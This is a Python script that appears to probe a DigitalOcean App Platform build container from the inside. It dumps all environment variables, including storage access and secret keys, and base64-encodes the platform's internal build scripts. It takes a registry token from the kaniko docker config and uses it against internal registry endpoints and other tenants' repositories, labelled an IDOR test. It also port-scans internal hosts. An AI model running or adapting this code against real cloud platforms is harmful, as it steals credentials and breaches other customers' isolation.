import json, os, socket, base64, subprocess, struct

r = {}

# 1. Full env dump - look for SPACES_* vars
r['full_env'] = {k:v for k,v in os.environ.items()}

# 2. Check all SPACES vars specifically
for key in ['SPACES_BUCKET_NAME', 'SPACES_ENDPOINT', 'SPACES_ACCESS_KEY', 'SPACES_SECRET_KEY',
            'APP_IMAGE_URL', 'APP_PLATFORM_COMPONENT_TYPE', 'STATIC_SITE_OUTPUT_DIR',
            'DOCKERFILE_PATH', 'SOURCE_DIR', 'APP_CACHE_DIR', 'APP_CACHE_URL',
            'DOCKER_HUB_MIRROR', 'DOCKER_HUB_MIRROR_CERT', 'SKIP_EXPORT']:
    r[f'var_{key}'] = os.environ.get(key, 'NOT_SET')

# 3. Read build.sh to understand Spaces export flow
try:
    data = open('/.app_platform/build.sh').read()
    # Find the spaces-exporter invocation
    lines = data.split('\n')
    spaces_lines = [l for l in lines if 'spaces' in l.lower() or 'export' in l.lower() or 'static' in l.lower()]
    r['build_sh_spaces_lines'] = spaces_lines[:30]
except Exception as e:
    r['build_sh'] = str(e)[:100]

# 4. Read util.sh for helper functions
try:
    data = open('/.app_platform/util.sh').read()
    r['util_sh_b64'] = base64.b64encode(data.encode()).decode()
except Exception as e:
    r['util_sh'] = str(e)[:100]

# 5. Read sensitive-sanitize-args.sh
try:
    data = open('/.app_platform/sensitive-sanitize-args.sh').read()
    r['sanitize_sh_b64'] = base64.b64encode(data.encode()).decode()
except Exception as e:
    r['sanitize_sh'] = str(e)[:100]

# 6. Read build-init.sh
try:
    data = open('/.app_platform/build-init.sh').read()
    r['build_init_sh_b64'] = base64.b64encode(data.encode()).decode()
except Exception as e:
    r['build_init_sh'] = str(e)[:100]

# 7. Check DOCR token - try to list ALL repos (not catalog, but specific patterns)
try:
    import urllib.request, ssl
    ctx = ssl.create_default_context()
    cfg = json.loads(open('/kaniko/.docker/config.json').read())
    token = None
    for host, creds in cfg.get('auths', {}).items():
        if 'registrytoken' in creds:
            token = creds['registrytoken']
            r['docr_host'] = host
            break
    if token:
        # Try internal DOCR endpoint with the same token
        for endpoint in ['https://apps-nyc.docr.space/v2/_catalog',
                         'https://apps-nyc.docr.space/v2/']:
            try:
                req = urllib.request.Request(endpoint)
                req.add_header('Authorization', f'Bearer {token}')
                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                r[f'internal_{endpoint}'] = resp.read().decode()[:1000]
            except Exception as e:
                r[f'internal_{endpoint}'] = str(e)[:200]

        # Try to push a manifest to a different app's repo (write IDOR)
        # Just test access, don't actually push
        for test_repo in ['apps-nyc3-00000000-0000-0000-0000-000000000000/web',
                          'apps-nyc3-aaad91f0-ab40-4d8a-a70b-9a6d47e4cb36/evil']:
            try:
                req = urllib.request.Request(f'https://registry.digitalocean.com/v2/{test_repo}/tags/list')
                req.add_header('Authorization', f'Bearer {token}')
                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                r[f'write_idor_{test_repo}'] = resp.read().decode()[:500]
            except Exception as e:
                r[f'write_idor_{test_repo}'] = str(e)[:200]

except Exception as e:
    r['docr_test'] = str(e)[:200]

# 8. Check /.app_platform directory fully
try:
    for root, dirs, files in os.walk('/.app_platform'):
        for f in files:
            fp = os.path.join(root, f)
            try:
                st = os.stat(fp)
                r[f'file_{fp}'] = f'size={st.st_size} mode={oct(st.st_mode)}'
            except: pass
except: pass

# 9. Check /kaniko directory fully
try:
    for root, dirs, files in os.walk('/kaniko'):
        for f in files:
            fp = os.path.join(root, f)
            try:
                st = os.stat(fp)
                r[f'file_{fp}'] = f'size={st.st_size} mode={oct(st.st_mode)}'
            except: pass
except: pass

# 10. Network scan - internal build service endpoints
for host_port in [('apps-nyc.docr.space', 443), ('apps-nyc.docr.space', 5000),
                  ('registry.digitalocean.com', 443), ('registry.digitalocean.com', 5000)]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        rc = s.connect_ex((host_port[0], host_port[1]))
        r[f'net_{host_port[0]}:{host_port[1]}'] = 'OPEN' if rc == 0 else f'errno={rc}'
        s.close()
    except Exception as e:
        r[f'net_{host_port[0]}:{host_port[1]}'] = str(e)[:100]

# 11. Check what user we are, capabilities
r['uid'] = os.getuid()
r['gid'] = os.getgid()
try:
    r['capeff'] = open('/proc/self/status').read().split('CapEff:')[1].split('\n')[0].strip()
except: pass

# 12. Check mount info for kata-qemu evidence
try:
    r['mountinfo'] = open('/proc/self/mountinfo').read()[:2000]
except: pass

print(json.dumps(r, indent=2, default=str))
